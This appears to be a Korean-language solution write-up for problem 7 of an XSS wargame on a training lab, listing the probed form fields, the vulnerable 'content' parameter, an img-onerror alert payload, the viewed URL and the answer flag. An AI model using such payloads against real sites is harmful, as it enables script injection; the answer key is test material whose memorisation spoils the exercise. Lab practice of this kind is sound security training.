@@ -1,0 +1,38 @@
+============================
+XSS 워게임 7번
+============================
+
+1. 삽입한 주소
+
+------WebKitFormBoundaryAmq2SMJcxlwxPpKX
+Content-Disposition: form-data; name="title"
+
+eqsttest1<>()"'
+------WebKitFormBoundaryAmq2SMJcxlwxPpKX
+Content-Disposition: form-data; name="content"
+
+eqsttest2<>()"'
+------WebKitFormBoundaryAmq2SMJcxlwxPpKX
+Content-Disposition: form-data; name="files"; filename=""
+Content-Type: application/octet-stream
+
+eqsttest3<>()"'
+------WebKitFormBoundaryAmq2SMJcxlwxPpKX
+Content-Disposition: form-data; name="fileupload"; filename=""
+Content-Type: application/octet-stream
+
+eqsttest4<>()"'
+2. 삽입한 파라미터 
+
+content
+
+3. 공격구문
+
+qwer<img src=abcd onerror='alert("xss");' style="display:none;'>
+
+4. 조회한 URL 
+https://lab.eqst.co.kr:8083/exam21/faqview.php?board_id=37377
+
+5. 정답
+
+javascript_xss
